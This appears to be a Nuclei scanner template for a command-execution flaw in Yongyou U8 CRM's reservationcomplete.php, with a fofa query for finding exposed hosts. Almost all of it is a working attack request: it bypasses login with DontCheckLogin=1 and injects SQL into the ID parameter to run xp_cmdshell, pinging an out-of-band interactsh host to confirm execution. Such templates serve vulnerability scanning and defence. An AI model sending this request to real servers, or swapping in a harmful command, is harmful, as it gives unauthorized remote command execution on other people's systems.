id: yongyouU8-CRM-bgt-reservationcomplete-RCE

info:
  tags: yongyouU8-CRM-bgt-reservationcomplete-RCE
  name: 用友U8 CRM reservationcomplete.php 命令执行
  author: xc
  severity: high
  description: |-
    fofa: title="用友U8CRM"

http:
  - raw:
      - |
        GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=1112;exec%20master..xp_cmdshell%20%27ping%20{{interactsh-url}}%27; HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Cookie: PHPSESSID=bgsesstimeout-
        Upgrade-Insecure-Requests: 1
        X-Forwarded-For: 192.168.1.1
        Priority: u=0, i

    matchers:
      - type: word
        part: interactsh_protocol
        words:
        - "dns"






